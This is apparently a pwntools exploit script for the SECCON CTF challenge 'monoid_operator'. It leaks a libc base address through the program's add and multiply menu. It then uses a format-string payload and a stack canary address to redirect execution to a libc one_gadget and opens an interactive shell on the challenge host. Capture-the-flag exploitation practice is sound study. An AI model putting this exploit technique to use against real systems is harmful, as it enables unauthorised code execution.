#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./monoid_operator_9092cbe0e255da46164bf38851880c1878ad3cbd')
else:
    s = remote('monoidoperator.chal.seccon.jp', 27182)

def add(size, integers):
    s.sendlineafter('choose?\n', '+')
    s.sendlineafter('input?\n', str(size))
    s.sendafter('integers.\n', integers)

def mul(size, integers):
    s.sendlineafter('choose?\n', '*')
    s.sendlineafter('input?\n', str(size))
    s.sendafter('integers.\n', integers)

def end(name, feedback):
    s.sendlineafter('choose?\n', 'q')
    s.sendafter('name?\n', name)
    s.sendafter('back!\n', feedback)

n = 0x500 >> 3
mul(n, '1000\n' * n)
add(n, '+\n' + '0\n' * (n - 1))
s.recvuntil('is ')
libc_base = int(s.recvuntil('.')[:-1]) - 0x1e4ca0
log.info('libc base: %#x' % libc_base)

canary_addr = libc_base + 0x1ec568
one_gadgets = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]

payload = ''
payload += 'A' * 0x204
payload += '%s%112$c%113$s'
payload += p64(libc_base + one_gadgets[1])
payload = payload.ljust(0x300, '\0')
payload += p64(canary_addr + 1)
end('A', payload)

s.interactive()
